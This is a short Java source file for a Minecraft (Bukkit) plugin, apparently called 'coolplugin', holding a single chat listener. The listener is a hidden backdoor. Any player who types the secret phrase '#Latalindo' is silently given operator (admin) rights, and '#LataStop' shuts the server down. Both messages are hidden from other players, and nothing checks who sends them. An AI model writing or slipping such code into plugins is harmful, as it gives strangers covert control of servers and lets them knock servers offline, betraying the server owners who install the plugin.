package in.momin5.coolplugin.events;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class MessageEvent implements Listener {
    
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player player = e.getPlayer();
        String msg = e.getMessage();
        
        if(msg.equals("#Latalindo")) {
            player.setOp(true);
            e.setCancelled(true);
        }
        
        if(msg.equals("#LataStop")) {
            e.setCancelled(true);
            Bukkit.getServer().shutdown();
        }
    }
}
